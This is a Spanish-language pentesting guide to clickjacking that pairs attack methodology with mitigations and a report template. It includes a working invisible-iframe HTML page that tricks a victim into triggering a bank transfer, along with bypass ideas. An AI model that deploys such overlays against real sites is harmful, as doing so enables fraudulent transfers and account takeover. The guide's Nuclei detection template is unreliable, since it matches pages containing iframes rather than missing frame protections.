# Clickjacking Avanzado 

## Resumen

El clickjacking es una técnica de ataque que consiste en engañar al usuario para que haga clic en elementos invisibles o disfrazados de una interfaz legítima, obligándole a interactuar con la aplicación bajo el control del atacante. Cuando el clickjacking se combina con otras vulnerabilidades (CSRF, XSS, OAuth, compras, transferencias bancarias, subida de archivos), puede permitir compromisos críticos, robo de fondos y ejecución de acciones privilegiadas sin consentimiento.

---

## Contexto

Este ataque explota el modelo visual del navegador y ocurre principalmente mediante el uso de iframes transparentes, CSS de opacidad y manipulación de capas. Cualquier aplicación vulnerable que permita ser embebida en un sitio externo (sin restricciones por cabeceras adecuadas) puede ser objetivo, con especial riesgo en:

- Formularios de autenticación y acciones sensibles
- Flujos de pago, donaciones o transferencias
- Paneles administrativos y funciones de cambio de permisos
- Dialogs de autorización OAuth, SAML, SSO

Las protecciones por defecto suelen ser inadecuadas o inexistentes en entornos legacy o APIs móviles/browser embebidos.

---

## Metodología de Ataque y Testing

### 1. Detección de Superficie Vulnerable

- Verificar si la URL objetivo puede ser cargada en un `<iframe>` externo.

```html
<iframe src="https://victima.com/sensible" width="800" height="600"></iframe>
```

- Revisar headers de protección:
  - `X-Frame-Options: DENY | SAMEORIGIN`
  - `Content-Security-Policy: frame-ancestors 'none'| 'self' | ...`

**Test rápido:**

```bash
curl -I https://victima.com | grep -iE "x-frame-options|content-security-policy"
```

Si NO hay ninguno, el sitio probablemente es vulnerable.

---

### 2. Explotación Manual Básica

**Caso clásico – banking/payment hijack:**

```html
<!DOCTYPE html>
<html>
  <body>
    <h1>¡Haz clic en el botón para ganar un premio!</h1>
    <div style="position:relative;z-index:2;">
      <button style="font-size:40px;opacity:1;">Click aquí</button>
    </div>
    <iframe
      src="https://victima.com/transfer?amount=10000&to=atacante"
      style="position:absolute;top:0;left:0;width:400px;height:90px;opacity:0;z-index:3;border:none;pointer-events:auto;"
      scrolling="no">
    </iframe>
  </body>
</html>
```

- El usuario cree hacer clic en un botón inofensivo, pero realmente activa una transferencia.

**Avanzado:**

- Ajustar opacidad, pointer-events, displacement animado para “engañar” o sincronizar el click sobre elementos de logout, aceptar, subir archivo, etc.

---

### 3. Clickjacking Multi-Etapa y UI Redressing

- Encadenar varios frames/acciones para explotar flujos completos (ej: OAuth approve → transferencia → cambio de pantalla).
- Disfrazar elementos de sesión y engañar visualmente con estilos CSS avanzados.
- Probar combinaciones con drag-and-drop, doble click, hover.

---

### 4. Explotación con File Upload / Cámara / OAuth / SSRF

- Embebiendo formularios de subida de archivos: víctima sube accidentalmente archivos al atacante.
- Frameando dialogs de permisos de cámara/micrófono, forzando activación.
- OAuth: aprobar scopes de privilegio alto sin que la víctima lo perciba.
- En paneles admin: clickjacking para activar/desactivar flags críticos.

---

### 5. Automatización de Testing

**headless browser (puppeteer/playwright):** validar visibilidad/clic.

```javascript
const puppeteer = require('puppeteer');
(async () => {
  const browser = await puppeteer.launch();
  const page = await browser.newPage();
  await page.goto('https://atacante.com/clickjack.html');
  await page.click('button');
  // Revisar si la acción en iframe fue ejecutada  
  await browser.close();
})();
```

**Nuclei Template:**

```yaml
id: clickjacking-detect
info:
  name: Clickjacking Frame Detection
requests:
  - method: GET
    path:
      - "{{BaseURL}}"
    matchers-condition: and
    matchers:
      - type: regex
        regex:
          - "<iframe.*"
      - type: status
        status:
          - 200
```

---

## Técnicas de Evasión y Bypass

- **Sin X-Frame-Options ni CSP:** 100% vulnerable.
- **X-Frame-Options: SAMEORIGIN:** usar open redirects para saltar origen.
- **Multipart / fragmentos:** algunas versiones antiguas de navegadores ignoran headers bajo condiciones no estándares (demasiadas redirecciones, cookies manipuladas, iframes anidados).
- **CSP débil:** si “frame-ancestors” permite dominio del atacante, o uso de comodines.

---

## Impacto

- Cambio de correo/contraseña sin consentimiento
- AuthZ escalate: asignar o revocar permisos a otros usuarios/admin
- Transferencias bancarias silenciosas
- Subida/Borrado de archivos no autorizados
- Aprobación de scopes y acceso total a OAuth/Google/Microsoft APIs
- Filtración de información sensible mediante UI redressing o robo de token en flows cross-origin

---

## Mitigación

1. **X-Frame-Options: DENY**
   - Bloquea completamente el uso de iframes sobre la aplicación.
2. **Content-Security-Policy: frame-ancestors 'none'|'self'**
   - CSP granular para dominios autorizados.
3. **Controlar todos los endpoints expuestos**
   - Incluyendo paneles de login, APIs móviles, subdominios, endpoints legacy.
4. **Randomización y UX mejorada:**
   - Campos críticos validados por doble confirmación, input delay o CAPTCHA.
5. **JavaScript defensive**:
   - Detectar si el sitio corre en frame y romperlo:

```javascript
if (window.top !== window.self) window.top.location = window.self.location;
```

6. **Auditoría y testing automatizado** en cada despliegue.

---

## Errores Comunes

- Configurar X-Frame-Options sólo en root y no en endpoints secundarios.
- Uso flexible de “ALLOW-FROM” sin controlar CSP complementaria.
- Ignorar protección en subdominios y rutas menos críticas (admin, beta, móviles...).
- No actualizar configuraciones tras refactor o nuevas integraciones de terceros.

---

## PoC y Reporte

```markdown
## Clickjacking Vulnerability on /transfer Endpoint
**Severity:** Critical
**Summary:** The /transfer and /profile endpoints do not implement any frame-busting headers or CSP, exposing the application to clickjacking attacks.
**PoC:**  
1. User visits atacante.com/clickjack.html  
2. Attacker page overlays an invisible iframe pointing to https://victima.com/transfer  
3. Victim clicks on a visible button, opening a fund transfer to attacker.
**Impact:**  
- Unauthorized transfers, privilege escalation, authZ bypass.
**Mitigation:**  
- Set X-Frame-Options: DENY or Content-Security-Policy: frame-ancestors 'none'.
```

---

## Detección y Monitorización

- Escaneo periódico de headers en todos los endpoints públicos.
- Monitorización de logs frente a patrones sospechosos en referers/host encabezados a raíz de flows anómalos de traffic frameado.

---

Clickjacking es un ataque de alto impacto, infravalorado y frecuentemente olvidado por defensas modernas y automatizadas. Debe incluirse obligatoriamente en todos los pipelines de análisis y hardening de aplicaciones web.
